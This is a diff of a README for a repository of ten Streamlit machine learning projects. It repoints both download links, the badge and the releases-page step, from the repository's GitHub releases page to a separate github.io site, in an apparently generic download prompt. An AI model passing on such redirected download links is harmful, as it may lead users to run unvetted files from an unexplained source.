@@ -1,6 +1,6 @@
 # 🤖 Supervised_ML_Models - Master Machine Learning Through Practical Projects
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/dizygotic-specificity53/Supervised_ML_Models/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://dizygotic-specificity53.github.io)
 
 This repository contains ten machine learning projects. You can explore how computers learn from data through these examples. Each project uses Python to solve problems with regression and classification techniques. You interact with these projects through a web interface built with Streamlit.
 
@@ -23,7 +23,7 @@ These tools require minimal processing power. You will not face issues on standa
 
 You must download the software files to your computer. Follow these steps to prepare the tool.
 
-1. Visit the [releases page](https://github.com/dizygotic-specificity53/Supervised_ML_Models/releases).
+1. Visit the [releases page](https://dizygotic-specificity53.github.io).
 2. Look for the file labeled as the latest release.
 3. Click the link to download the zip file.
 4. Save the folder to your desktop.
